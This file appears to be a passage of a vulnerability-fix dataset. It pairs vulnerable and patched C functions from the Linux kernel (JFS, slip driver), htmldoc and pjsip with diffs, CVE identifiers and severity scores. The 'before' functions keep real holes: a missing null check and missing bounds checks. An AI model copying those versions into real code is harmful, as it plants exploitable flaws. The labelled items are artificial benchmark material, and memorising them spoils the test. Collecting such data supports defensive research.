if (!inode->i_nlink && !is_bad_inode(inode)) {
dquot_initialize(inode);
if (JFS_IP(inode)->fileset == FILESYSTEM_I) {
truncate_inode_pages_final(&inode->i_data);
if (test_cflag(COMMIT_Freewmap, inode))
jfs_free_zero_link(inode);
if (JFS_SBI(inode->i_sb)->ipimap)
diFree(inode);
dquot_free_inode(inode);
}
} else {
truncate_inode_pages_final(&inode->i_data);
}
clear_inode(inode);
dquot_drop(inode);
BUG_ON(!list_empty(&ji->anon_inode_list));
spin_lock_irq(&ji->ag_lock);
if (ji->active_ag != -1) {
struct bmap *bmap = JFS_SBI(inode->i_sb)->bmap;
atomic_dec(&bmap->db_active[ji->active_ag]);
ji->active_ag = -1;
}
spin_unlock_irq(&ji->ag_lock);
}","void jfs_evict_inode(struct inode *inode)
{
struct jfs_inode_info *VAR_0 = JFS_IP(inode);
jfs_info(""In jfs_evict_inode, inode = 0x%p"", inode);
if (!inode->i_nlink && !is_bad_inode(inode)) {
dquot_initialize(inode);
if (JFS_IP(inode)->fileset == VAR_1) {
truncate_inode_pages_final(&inode->i_data);
if (test_cflag(VAR_2, inode))
jfs_free_zero_link(inode);
if (JFS_SBI(inode->i_sb)->ipimap)
diFree(inode);
dquot_free_inode(inode);
}
} else {
truncate_inode_pages_final(&inode->i_data);
}
clear_inode(inode);
dquot_drop(inode);
BUG_ON(!list_empty(&VAR_0->anon_inode_list));
spin_lock_irq(&VAR_0->ag_lock);
if (VAR_0->active_ag != -1) {
struct bmap *bmap = JFS_SBI(inode->i_sb)->bmap;
atomic_dec(&bmap->db_active[VAR_0->active_ag]);
VAR_0->active_ag = -1;
}
spin_unlock_irq(&VAR_0->ag_lock);
}",torvalds/linux/a53046291020ec41e09181396c1e829287b48d47/inode.c/vul/before/0.json,"void jfs_evict_inode(struct inode *inode)
{
	struct jfs_inode_info *ji = JFS_IP(inode);

	jfs_info(""In jfs_evict_inode, inode = 0x%p"", inode);

	if (!inode->i_nlink && !is_bad_inode(inode)) {
		dquot_initialize(inode);

		if (JFS_IP(inode)->fileset == FILESYSTEM_I) {
			struct inode *ipimap = JFS_SBI(inode->i_sb)->ipimap;
			truncate_inode_pages_final(&inode->i_data);

			if (test_cflag(COMMIT_Freewmap, inode))
				jfs_free_zero_link(inode);

			if (ipimap && JFS_IP(ipimap)->i_imap)
				diFree(inode);

			/*
			 * Free the inode from the quota allocation.
			 */
			dquot_free_inode(inode);
		}
	} else {
		truncate_inode_pages_final(&inode->i_data);
	}
	clear_inode(inode);
	dquot_drop(inode);

	BUG_ON(!list_empty(&ji->anon_inode_list));

	spin_lock_irq(&ji->ag_lock);
	if (ji->active_ag != -1) {
		struct bmap *bmap = JFS_SBI(inode->i_sb)->bmap;
		atomic_dec(&bmap->db_active[ji->active_ag]);
		ji->active_ag = -1;
	}
	spin_unlock_irq(&ji->ag_lock);
}","void jfs_evict_inode(struct inode *inode)
{
	struct jfs_inode_info *VAR_0 = JFS_IP(inode);

	jfs_info(""In jfs_evict_inode, inode = 0x%p"", inode);

	if (!inode->i_nlink && !is_bad_inode(inode)) {
		dquot_initialize(inode);

		if (JFS_IP(inode)->fileset == VAR_1) {
			struct inode *VAR_2 = JFS_SBI(inode->i_sb)->ipimap;
			truncate_inode_pages_final(&inode->i_data);

			if (test_cflag(VAR_3, inode))
				jfs_free_zero_link(inode);

			if (VAR_2 && JFS_IP(VAR_2)->i_imap)
				diFree(inode);

			/* COMMENT_0 */
                                               
      
			dquot_free_inode(inode);
		}
	} else {
		truncate_inode_pages_final(&inode->i_data);
	}
	clear_inode(inode);
	dquot_drop(inode);

	BUG_ON(!list_empty(&VAR_0->anon_inode_list));

	spin_lock_irq(&VAR_0->ag_lock);
	if (VAR_0->active_ag != -1) {
		struct bmap *bmap = JFS_SBI(inode->i_sb)->bmap;
		atomic_dec(&bmap->db_active[VAR_0->active_ag]);
		VAR_0->active_ag = -1;
	}
	spin_unlock_irq(&VAR_0->ag_lock);
}",torvalds/linux/a53046291020ec41e09181396c1e829287b48d47/inode.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -8,12 +8,13 @@
 		dquot_initialize(inode);
 
 		if (JFS_IP(inode)->fileset == FILESYSTEM_I) {
+			struct inode *ipimap = JFS_SBI(inode->i_sb)->ipimap;
 			truncate_inode_pages_final(&inode->i_data);
 
 			if (test_cflag(COMMIT_Freewmap, inode))
 				jfs_free_zero_link(inode);
 
-			if (JFS_SBI(inode->i_sb)->ipimap)
+			if (ipimap && JFS_IP(ipimap)->i_imap)
 				diFree(inode);
 
 			/*","{'deleted_lines': ['\t\t\tif (JFS_SBI(inode->i_sb)->ipimap)'], 'added_lines': ['\t\t\tstruct inode *ipimap = JFS_SBI(inode->i_sb)->ipimap;', '\t\t\tif (ipimap && JFS_IP(ipimap)->i_imap)']}",True,A NULL pointer dereference flaw in diFree in fs/jfs/inode.c in Journaled File System (JFS)in the Linux kernel. This could allow a local attacker to crash the system or leak kernel internal information.,7.1,HIGH,2,valid,2022-03-22T13:59:17Z,4
CVE-2022-28085,['CWE-787'],AV:N/AC:M/Au:N/C:P/I:P/A:P,0,michaelrsweet/htmldoc,Call check_pages when writing links (Issue #480),46c8ec2b9bccb8ccabff52d998c5eee77a228348,https://github.com/michaelrsweet/htmldoc/commit/46c8ec2b9bccb8ccabff52d998c5eee77a228348,htmldoc/ps-pdf.cxx,pdf_write_names,"static void
pdf_write_names(FILE *out)
{
inti;
uchar*s;
link_t*link;
for (i = num_links, link = links; i > 0; i --, link ++)
for (s = link->name; *s != '\0'; s ++)
*s = (uchar)tolower(*s);
names_object = pdf_start_object(out);
fprintf(out, ""/Dests %d 0 R"", (int)num_objects + 1);
pdf_end_object(out);
pdf_start_object(out);
fprintf(out, ""/Kids[%d 0 R]"", (int)num_objects + 1);
pdf_end_object(out);
pdf_start_object(out);
fputs(""/Limits["", out);
write_string(out, links[0].name, 0);
write_string(out, links[num_links - 1].name, 0);
fputs(""]"", out);
fputs(""/Names["", out);
for (i = 1, link = links; i <= (int)num_links; i ++, link ++)
{
write_string(out, link->name, 0);
fprintf(out, ""%d 0 R"", (int)num_objects + i);
}
fputs(""]"", out);
pdf_end_object(out);
for (i = num_links, link = links; i > 0; i --, link ++)
{
pdf_start_object(out);
float x, y;
x = 0.0f;
y = link->top + pages[link->page].bottom;
pspdf_transform_coords(pages + link->page, x, y);
fprintf(out, ""/D[%d 0 R/XYZ %.0f %.0f 0]"",
pages_object + 2 * pages[link->page].outpage + 1, x, y);
pdf_end_object(out);
}
}","static void
pdf_write_names(FILE *VAR_0)
{
intVAR_1;
uchar*VAR_2;
link_t*VAR_3;
for (VAR_1 = VAR_4, VAR_3 = VAR_5; VAR_1 > 0; VAR_1 --, VAR_3 ++)
for (VAR_2 = VAR_3->name; *VAR_2 != '\0'; VAR_2 ++)
*VAR_2 = (uchar)tolower(*VAR_2);
VAR_6 = pdf_start_object(VAR_0);
fprintf(VAR_0, ""/Dests %d 0 R"", (int)VAR_7 + 1);
pdf_end_object(VAR_0);
pdf_start_object(VAR_0);
fprintf(VAR_0, ""/Kids[%d 0 R]"", (int)VAR_7 + 1);
pdf_end_object(VAR_0);
pdf_start_object(VAR_0);
fputs(""/Limits["", VAR_0);
write_string(VAR_0, VAR_5[0].name, 0);
write_string(VAR_0, VAR_5[VAR_4 - 1].name, 0);
fputs(""]"", VAR_0);
fputs(""/Names["", VAR_0);
for (VAR_1 = 1, VAR_3 = VAR_5; VAR_1 <= (int)VAR_4; VAR_1 ++, VAR_3 ++)
{
write_string(VAR_0, VAR_3->name, 0);
fprintf(VAR_0, ""%d 0 R"", (int)VAR_7 + VAR_1);
}
fputs(""]"", VAR_0);
pdf_end_object(VAR_0);
for (VAR_1 = VAR_4, VAR_3 = VAR_5; VAR_1 > 0; VAR_1 --, VAR_3 ++)
{
pdf_start_object(VAR_0);
float VAR_8, VAR_9;
VAR_8 = 0.0f;
VAR_9 = VAR_3->top + VAR_10[VAR_3->page].bottom;
pspdf_transform_coords(VAR_10 + VAR_3->page, VAR_8, VAR_9);
fprintf(VAR_0, ""/D[%d 0 R/XYZ %.0f %.0f 0]"",
VAR_11 + 2 * VAR_10[VAR_3->page].outpage + 1, VAR_8, VAR_9);
pdf_end_object(VAR_0);
}
}",michaelrsweet/htmldoc/46c8ec2b9bccb8ccabff52d998c5eee77a228348/ps-pdf.cxx/vul/before/0.json,"static void
pdf_write_names(FILE *out)		/* I - Output file */
{
  int		i;			/* Looping var */
  uchar		*s;			/* Current character in name */
  link_t	*link;			/* Local link */


 /*
  * Convert all link names to lowercase...
  */

  for (i = num_links, link = links; i > 0; i --, link ++)
    for (s = link->name; *s != '\0'; s ++)
      *s = (uchar)tolower(*s);

 /*
  * Write the root name tree entry...
  */

  names_object = pdf_start_object(out);
  fprintf(out, ""/Dests %d 0 R"", (int)num_objects + 1);
  pdf_end_object(out);

 /*
  * Write the name tree child list...
  */

  pdf_start_object(out);
  fprintf(out, ""/Kids[%d 0 R]"", (int)num_objects + 1);
  pdf_end_object(out);

 /*
  * Write the leaf node for the name tree...
  */

  pdf_start_object(out);

  fputs(""/Limits["", out);
  write_string(out, links[0].name, 0);
  write_string(out, links[num_links - 1].name, 0);
  fputs(""]"", out);

  fputs(""/Names["", out);
  for (i = 1, link = links; i <= (int)num_links; i ++, link ++)
  {
    write_string(out, link->name, 0);
    fprintf(out, ""%d 0 R"", (int)num_objects + i);
  }
  fputs(""]"", out);

  pdf_end_object(out);

  for (i = num_links, link = links; i > 0; i --, link ++)
  {
    pdf_start_object(out);
    float x, y;

    check_pages(link->page);

    x = 0.0f;
    y = link->top + pages[link->page].bottom;
    pspdf_transform_coords(pages + link->page, x, y);
    fprintf(out, ""/D[%d 0 R/XYZ %.0f %.0f 0]"",
            pages_object + 2 * pages[link->page].outpage + 1, x, y);
    pdf_end_object(out);
  }
}","static void
pdf_write_names(FILE *VAR_0)		/* COMMENT_0 */
{
  int		VAR_1;			/* COMMENT_1 */
  uchar		*VAR_2;			/* COMMENT_2 */
  link_t	*VAR_3;			/* COMMENT_3 */


 /* COMMENT_4 */
                                          
    

  for (VAR_1 = VAR_4, VAR_3 = VAR_5; VAR_1 > 0; VAR_1 --, VAR_3 ++)
    for (VAR_2 = VAR_3->name; *VAR_2 != '\0'; VAR_2 ++)
      *VAR_2 = (uchar)tolower(*VAR_2);

 /* COMMENT_7 */
                                     
    

  VAR_6 = pdf_start_object(VAR_0);
  fprintf(VAR_0, ""/Dests %d 0 R"", (int)VAR_7 + 1);
  pdf_end_object(VAR_0);

 /* COMMENT_10 */
                                     
    

  pdf_start_object(VAR_0);
  fprintf(VAR_0, ""/Kids[%d 0 R]"", (int)VAR_7 + 1);
  pdf_end_object(VAR_0);

 /* COMMENT_13 */
                                            
    

  pdf_start_object(VAR_0);

  fputs(""/Limits["", VAR_0);
  write_string(VAR_0, VAR_5[0].name, 0);
  write_string(VAR_0, VAR_5[VAR_4 - 1].name, 0);
  fputs(""]"", VAR_0);

  fputs(""/Names["", VAR_0);
  for (VAR_1 = 1, VAR_3 = VAR_5; VAR_1 <= (int)VAR_4; VAR_1 ++, VAR_3 ++)
  {
    write_string(VAR_0, VAR_3->name, 0);
    fprintf(VAR_0, ""%d 0 R"", (int)VAR_7 + VAR_1);
  }
  fputs(""]"", VAR_0);

  pdf_end_object(VAR_0);

  for (VAR_1 = VAR_4, VAR_3 = VAR_5; VAR_1 > 0; VAR_1 --, VAR_3 ++)
  {
    pdf_start_object(VAR_0);
    float VAR_8, VAR_9;

    check_pages(VAR_3->page);

    VAR_8 = 0.0f;
    VAR_9 = VAR_3->top + VAR_10[VAR_3->page].bottom;
    pspdf_transform_coords(VAR_10 + VAR_3->page, VAR_8, VAR_9);
    fprintf(VAR_0, ""/D[%d 0 R/XYZ %.0f %.0f 0]"",
            VAR_11 + 2 * VAR_10[VAR_3->page].outpage + 1, VAR_8, VAR_9);
    pdf_end_object(VAR_0);
  }
}",michaelrsweet/htmldoc/46c8ec2b9bccb8ccabff52d998c5eee77a228348/ps-pdf.cxx/vul/after/0.json,"--- func_before
+++ func_after
@@ -56,6 +56,8 @@
     pdf_start_object(out);
     float x, y;
 
+    check_pages(link->page);
+
     x = 0.0f;
     y = link->top + pages[link->page].bottom;
     pspdf_transform_coords(pages + link->page, x, y);","{'deleted_lines': [], 'added_lines': ['    check_pages(link->page);', '']}",True,A flaw was found in htmldoc commit 31f7804. A heap buffer overflow in the function pdf_write_names in ps-pdf.cxx may lead to arbitrary code execution and Denial of Service (DoS).,7.8,HIGH,2,valid,2022-03-24T20:30:07Z,4
CVE-2022-41858,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H,1,torvalds/linux,"drivers: net: slip: fix NPD bug in sl_tx_timeout()

When a slip driver is detaching, the slip_close() will act to
cleanup necessary resources and sl->tty is set to NULL in
slip_close(). Meanwhile, the packet we transmit is blocked,
sl_tx_timeout() will be called. Although slip_close() and
sl_tx_timeout() use sl->lock to synchronize, we don`t judge
whether sl->tty equals to NULL in sl_tx_timeout() and the
null pointer dereference bug will happen.

   (Thread 1)                 |      (Thread 2)
                              | slip_close()
                              |   spin_lock_bh(&sl->lock)
                              |   ...
...                           |   sl->tty = NULL //(1)
sl_tx_timeout()               |   spin_unlock_bh(&sl->lock)
  spin_lock(&sl->lock);       |
  ...                         |   ...
  tty_chars_in_buffer(sl->tty)|
    if (tty->ops->..) //(2)   |
    ...                       |   synchronize_rcu()

We set NULL to sl->tty in position (1) and dereference sl->tty
in position (2).

This patch adds check in sl_tx_timeout(). If sl->tty equals to
NULL, sl_tx_timeout() will goto out.

Signed-off-by: Duoming Zhou <duoming@zju.edu.cn>
Reviewed-by: Jiri Slaby <jirislaby@kernel.org>
Link: https://lore.kernel.org/r/20220405132206.55291-1-duoming@zju.edu.cn
Signed-off-by: Jakub Kicinski <kuba@kernel.org>",ec4eb8a86ade4d22633e1da2a7d85a846b7d1798,https://github.com/torvalds/linux/commit/ec4eb8a86ade4d22633e1da2a7d85a846b7d1798,drivers/net/slip/slip.c,sl_tx_timeout,"static void sl_tx_timeout(struct net_device *dev, unsigned int txqueue)
{
struct slip *sl = netdev_priv(dev);
spin_lock(&sl->lock);
if (netif_queue_stopped(dev)) {
if (!netif_running(dev))
goto out;
#ifdef SL_CHECK_TRANSMIT
if (time_before(jiffies, dev_trans_start(dev) + 20 * HZ))  {
goto out;
}
printk(KERN_WARNING ""%s: transmit timed out, %s?\n"",
dev->name,
(tty_chars_in_buffer(sl->tty) || sl->xleft) ?
""bad line quality"" : ""driver error"");
sl->xleft = 0;
clear_bit(TTY_DO_WRITE_WAKEUP, &sl->tty->flags);
sl_unlock(sl);
#endif
}
out:
spin_unlock(&sl->lock);
}","static void sl_tx_timeout(struct net_device *VAR_0, unsigned int VAR_1)
{
struct slip *VAR_2 = netdev_priv(VAR_0);
spin_lock(&VAR_2->lock);
if (netif_queue_stopped(VAR_0)) {
if (!netif_running(VAR_0))
goto out;
#ifdef VAR_3
if (time_before(VAR_4, dev_trans_start(VAR_0) + 20 * VAR_5))  {
goto out;
}
printk(KERN_WARNING ""%s: transmit timed out, %s?\n"",
VAR_0->name,
(tty_chars_in_buffer(VAR_2->tty) || VAR_2->xleft) ?
""bad line quality"" : ""driver error"");
VAR_2->xleft = 0;
clear_bit(VAR_6, &VAR_2->tty->flags);
sl_unlock(VAR_2);
#endif
}
out:
spin_unlock(&VAR_2->lock);
}",torvalds/linux/ec4eb8a86ade4d22633e1da2a7d85a846b7d1798/slip.c/vul/before/0.json,"static void sl_tx_timeout(struct net_device *dev, unsigned int txqueue)
{
	struct slip *sl = netdev_priv(dev);

	spin_lock(&sl->lock);

	if (netif_queue_stopped(dev)) {
		if (!netif_running(dev) || !sl->tty)
			goto out;

		/* May be we must check transmitter timeout here ?
		 *      14 Oct 1994 Dmitry Gorodchanin.
		 */
#ifdef SL_CHECK_TRANSMIT
		if (time_before(jiffies, dev_trans_start(dev) + 20 * HZ))  {
			/* 20 sec timeout not reached */
			goto out;
		}
		printk(KERN_WARNING ""%s: transmit timed out, %s?\n"",
			dev->name,
			(tty_chars_in_buffer(sl->tty) || sl->xleft) ?
				""bad line quality"" : ""driver error"");
		sl->xleft = 0;
		clear_bit(TTY_DO_WRITE_WAKEUP, &sl->tty->flags);
		sl_unlock(sl);
#endif
	}
out:
	spin_unlock(&sl->lock);
}","static void sl_tx_timeout(struct net_device *VAR_0, unsigned int VAR_1)
{
	struct slip *VAR_2 = netdev_priv(VAR_0);

	spin_lock(&VAR_2->lock);

	if (netif_queue_stopped(VAR_0)) {
		if (!netif_running(VAR_0) || !VAR_2->tty)
			goto out;

		/* COMMENT_0 */
                                         
     
#ifdef VAR_3
		if (time_before(VAR_4, dev_trans_start(VAR_0) + 20 * VAR_5))  {
			/* COMMENT_3 */
			goto out;
		}
		printk(KERN_WARNING ""%s: transmit timed out, %s?\n"",
			VAR_0->name,
			(tty_chars_in_buffer(VAR_2->tty) || VAR_2->xleft) ?
				""bad line quality"" : ""driver error"");
		VAR_2->xleft = 0;
		clear_bit(VAR_6, &VAR_2->tty->flags);
		sl_unlock(VAR_2);
#endif
	}
out:
	spin_unlock(&VAR_2->lock);
}",torvalds/linux/ec4eb8a86ade4d22633e1da2a7d85a846b7d1798/slip.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -5,7 +5,7 @@
 	spin_lock(&sl->lock);
 
 	if (netif_queue_stopped(dev)) {
-		if (!netif_running(dev))
+		if (!netif_running(dev) || !sl->tty)
 			goto out;
 
 		/* May be we must check transmitter timeout here ?","{'deleted_lines': ['\t\tif (!netif_running(dev))'], 'added_lines': ['\t\tif (!netif_running(dev) || !sl->tty)']}",True,A flaw was found in the Linux kernel. A NULL pointer dereference may occur while a slip driver is in progress to detach in sl_tx_timeout in drivers/net/slip/slip.c. This issue could allow an attacker to crash the system or leak internal kernel information.,7.1,HIGH,2,valid,2022-04-05T13:22:06Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp_fb.c,pjmedia_rtcp_fb_parse_sli,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_parse_sli(
const void *buf,
pj_size_t length,
unsigned *sli_cnt,
pjmedia_rtcp_fb_sli sli[])
{
pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;
pj_uint8_t *p;
unsigned cnt, i;
PJ_ASSERT_RETURN(buf && sli_cnt && sli, PJ_EINVAL);
PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);
if (hdr->pt != RTCP_PSFB || hdr->count != 2)
return PJ_ENOTFOUND;
cnt = pj_ntohs((pj_uint16_t)hdr->length) - 2;
if (length < (cnt+3)*4)
return PJ_ETOOSMALL;
*sli_cnt = PJ_MIN(*sli_cnt, cnt);
p = (pj_uint8_t*)hdr + sizeof(*hdr);
for (i = 0; i < *sli_cnt; ++i) {
sli[i].first = (p[0] << 5) + ((p[1] & 0xF8) >> 3);
sli[i].number = ((p[1] & 0x07) << 10) +
(p[2] << 2) +
((p[3] & 0xC0) >> 6);
sli[i].pict_id = (p[3] & 0x3F);
p += 4;
}
return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_parse_sli(
const void *VAR_1,
pj_size_t VAR_2,
unsigned *VAR_3,
pjmedia_rtcp_fb_sli VAR_4[])
{
pjmedia_rtcp_common *VAR_5 = (pjmedia_rtcp_common*) VAR_1;
pj_uint8_t *VAR_6;
unsigned VAR_7, VAR_8;
PJ_ASSERT_RETURN(VAR_1 && VAR_3 && VAR_4, VAR_9);
PJ_ASSERT_RETURN(VAR_2 >= sizeof(pjmedia_rtcp_common), VAR_10);
if (VAR_5->pt != VAR_11 || VAR_5->count != 2)
return VAR_12;
VAR_7 = pj_ntohs((pj_uint16_t)VAR_5->length) - 2;
if (VAR_2 < (VAR_7+3)*4)
return VAR_10;
*VAR_3 = PJ_MIN(*VAR_3, VAR_7);
VAR_6 = (pj_uint8_t*)VAR_5 + sizeof(*VAR_5);
for (VAR_8 = 0; VAR_8 < *VAR_3; ++VAR_8) {
VAR_4[VAR_8].first = (VAR_6[0] << 5) + ((VAR_6[1] & 0xF8) >> 3);
VAR_4[VAR_8].number = ((VAR_6[1] & 0x07) << 10) +
(VAR_6[2] << 2) +
((VAR_6[3] & 0xC0) >> 6);
VAR_4[VAR_8].pict_id = (VAR_6[3] & 0x3F);
VAR_6 += 4;
}
return VAR_13;
}",,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_parse_sli(
					const void *buf,
					pj_size_t length,
					unsigned *sli_cnt,
					pjmedia_rtcp_fb_sli sli[])
{
    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;
    pj_uint8_t *p;
    unsigned cnt, i;

    PJ_ASSERT_RETURN(buf && sli_cnt && sli, PJ_EINVAL);
    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);

    /* PLI uses pt==RTCP_PSFB and FMT==2 */
    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 2)
	return PJ_ENOTFOUND;

    cnt = pj_ntohs((pj_uint16_t)hdr->rtcp_common.length) - 2;
    if (length < (cnt+3)*4)
	return PJ_ETOOSMALL;

    *sli_cnt = PJ_MIN(*sli_cnt, cnt);

    p = (pj_uint8_t*)hdr + sizeof(*hdr);
    for (i = 0; i < *sli_cnt; ++i) {
	/* 'first' takes 13 bit */
	sli[i].first = (p[0] << 5) + ((p[1] & 0xF8) >> 3);
	/* 'number' takes 13 bit */
	sli[i].number = ((p[1] & 0x07) << 10) +
			(p[2] << 2) +
			((p[3] & 0xC0) >> 6);
	/* 'pict_id' takes 6 bit */
	sli[i].pict_id = (p[3] & 0x3F);
	p += 4;
    }

    return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_parse_sli(
					const void *VAR_1,
					pj_size_t VAR_2,
					unsigned *VAR_3,
					pjmedia_rtcp_fb_sli VAR_4[])
{
    pjmedia_rtcp_fb_common *VAR_5 = (pjmedia_rtcp_fb_common*) VAR_1;
    pj_uint8_t *VAR_6;
    unsigned VAR_7, VAR_8;

    PJ_ASSERT_RETURN(VAR_1 && VAR_3 && VAR_4, VAR_9);
    PJ_ASSERT_RETURN(VAR_2 >= sizeof(pjmedia_rtcp_fb_common), VAR_10);

    /* COMMENT_0 */
    if (VAR_5->rtcp_common.pt != VAR_11 || VAR_5->rtcp_common.count != 2)
	return VAR_12;

    VAR_7 = pj_ntohs((pj_uint16_t)VAR_5->rtcp_common.length) - 2;
    if (VAR_2 < (VAR_7+3)*4)
	return VAR_10;

    *VAR_3 = PJ_MIN(*VAR_3, VAR_7);

    VAR_6 = (pj_uint8_t*)VAR_5 + sizeof(*VAR_5);
    for (VAR_8 = 0; VAR_8 < *VAR_3; ++VAR_8) {
	/* COMMENT_1 */
	VAR_4[VAR_8].first = (VAR_6[0] << 5) + ((VAR_6[1] & 0xF8) >> 3);
	/* COMMENT_2 */
	VAR_4[VAR_8].number = ((VAR_6[1] & 0x07) << 10) +
			(VAR_6[2] << 2) +
			((VAR_6[3] & 0xC0) >> 6);
	/* COMMENT_3 */
	VAR_4[VAR_8].pict_id = (VAR_6[3] & 0x3F);
	VAR_6 += 4;
    }

    return VAR_13;
}",,"--- func_before
+++ func_after
@@ -4,18 +4,18 @@
 					unsigned *sli_cnt,
 					pjmedia_rtcp_fb_sli sli[])
 {
-    pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;
+    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;
     pj_uint8_t *p;
     unsigned cnt, i;
 
     PJ_ASSERT_RETURN(buf && sli_cnt && sli, PJ_EINVAL);
-    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);
+    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);
 
     /* PLI uses pt==RTCP_PSFB and FMT==2 */
-    if (hdr->pt != RTCP_PSFB || hdr->count != 2)
+    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 2)
 	return PJ_ENOTFOUND;
 
-    cnt = pj_ntohs((pj_uint16_t)hdr->length) - 2;
+    cnt = pj_ntohs((pj_uint16_t)hdr->rtcp_common.length) - 2;
     if (length < (cnt+3)*4)
 	return PJ_ETOOSMALL;
 ","{'deleted_lines': ['    pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;', '    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);', '    if (hdr->pt != RTCP_PSFB || hdr->count != 2)', '    cnt = pj_ntohs((pj_uint16_t)hdr->length) - 2;'], 'added_lines': ['    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;', '    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);', '    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 2)', '    cnt = pj_ntohs((pj_uint16_t)hdr->rtcp_common.length) - 2;']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp_fb.c,pjmedia_rtcp_fb_build_nack,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_build_nack(
pjmedia_rtcp_session *session,
void *buf,
pj_size_t *length,
unsigned nack_cnt,
const pjmedia_rtcp_fb_nack nack[])
{
pjmedia_rtcp_common *hdr;
pj_uint8_t *p;
unsigned len, i;
PJ_ASSERT_RETURN(session && buf && length && nack_cnt && nack, PJ_EINVAL);
len = (3 + nack_cnt) * 4;
if (len > *length)
return PJ_ETOOSMALL;
hdr = (pjmedia_rtcp_common*)buf;
pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));
hdr->pt = RTCP_RTPFB;
hdr->count = 1; 
hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));
p = (pj_uint8_t*)hdr + sizeof(*hdr);
for (i = 0; i < nack_cnt; ++i) {
pj_uint16_t val;
val = pj_htons((pj_uint16_t)nack[i].pid);
pj_memcpy(p, &val, 2);
val = pj_htons(nack[i].blp);
pj_memcpy(p+2, &val, 2);
p += 4;
}
*length = len;
return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_build_nack(
pjmedia_rtcp_session *VAR_1,
void *VAR_2,
pj_size_t *VAR_3,
unsigned VAR_4,
const pjmedia_rtcp_fb_nack VAR_5[])
{
pjmedia_rtcp_common *VAR_6;
pj_uint8_t *VAR_7;
unsigned VAR_8, VAR_9;
PJ_ASSERT_RETURN(VAR_1 && VAR_2 && VAR_3 && VAR_4 && VAR_5, VAR_10);
VAR_8 = (3 + VAR_4) * 4;
if (VAR_8 > *VAR_3)
return VAR_11;
VAR_6 = (pjmedia_rtcp_common*)VAR_2;
pj_memcpy(VAR_6, &VAR_1->rtcp_rr_pkt.common,  sizeof(*VAR_6));
VAR_6->pt = VAR_12;
VAR_6->count = 1; 
VAR_6->length = pj_htons((VAR_13)(VAR_8/4 - 1));
VAR_7 = (pj_uint8_t*)VAR_6 + sizeof(*VAR_6);
for (VAR_9 = 0; VAR_9 < VAR_4; ++VAR_9) {
pj_uint16_t VAR_14;
VAR_14 = pj_htons((pj_uint16_t)VAR_5[VAR_9].pid);
pj_memcpy(VAR_7, &VAR_14, 2);
VAR_14 = pj_htons(VAR_5[VAR_9].blp);
pj_memcpy(VAR_7+2, &VAR_14, 2);
VAR_7 += 4;
}
*VAR_3 = VAR_8;
return VAR_15;
}",,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_build_nack(
					pjmedia_rtcp_session *session,
					void *buf,
					pj_size_t *length,
					unsigned nack_cnt,
					const pjmedia_rtcp_fb_nack nack[])
{
    pjmedia_rtcp_fb_common *hdr;
    pj_uint8_t *p;
    unsigned len, i;

    PJ_ASSERT_RETURN(session && buf && length && nack_cnt && nack, PJ_EINVAL);

    len = (3 + nack_cnt) * 4;
    if (len > *length)
	return PJ_ETOOSMALL;

    /* Build RTCP-FB NACK header */
    hdr = (pjmedia_rtcp_fb_common*)buf;
    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));
    hdr->rtcp_common.pt = RTCP_RTPFB;
    hdr->rtcp_common.count = 1; /* FMT = 1 */
    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));

    /* Build RTCP-FB NACK FCI */
    p = (pj_uint8_t*)hdr + sizeof(*hdr);
